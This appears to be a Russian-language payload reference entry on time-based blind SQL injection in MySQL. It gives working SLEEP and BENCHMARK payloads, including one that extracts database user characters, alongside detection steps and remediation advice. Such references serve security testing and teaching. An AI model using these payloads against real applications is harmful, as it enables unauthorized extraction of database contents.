---
id: sqli-mysql-time-based-sleep
title: "MySQL: time-based blind через SLEEP/BENCHMARK"
type: sqli
target: mysql
category: web
difficulty: intermediate
bypass: none
tags: [sqli, mysql, blind, time-based]
tested_on: ["MySQL 8.0", "SQLite 3.40 (sqli-lab)"]
success_rate: 0.7
risk: low
cwe: "CWE-89"
lab: "labs/web-labs/sqli-lab"
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/SQL_Injection"
  - "https://portswigger.net/web-security/sql-injection"
graph:
  - target: "sqli"
    type: instance_of
---

# MySQL: time-based blind через SLEEP/BENCHMARK

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
1' AND IF(1=1,SLEEP(5),0) -- -
```

## Explanation

Если приложение не возвращает ни ошибок, ни различимых ответов, каналом утечки становится
время. `IF(условие, SLEEP(5), 0)` задерживает ответ на 5 секунд при истинном условии.
Задержка = бит информации, из которого посимвольно собирается результат.
`BENCHMARK(10000000, SHA1('a'))` — альтернатива, когда `SLEEP` заблокирован фильтром.

## Detection

Измерьте baseline-время ответа (10 замеров), затем сравните с `SLEEP(5)`.
Устойчивая разница около 5 с подтверждает инъекцию. Автоматизация: `sqlmap --technique=T`.

## Remediation

- Параметризованные запросы.
- Таймауты на уровне приложения и БД (`MAX_EXECUTION_TIME`) — один запрос не должен
  занимать минуты.
- Rate limiting по IP/сессии; алерты на медленные запросы.

## Variants

```
1' AND (SELECT * FROM (SELECT SLEEP(5))a) -- -
```

```
1' AND BENCHMARK(5000000,MD5('x')) -- -
```

```
1' AND IF(ASCII(SUBSTRING(user(),1,1))=114,SLEEP(3),0) -- -
```
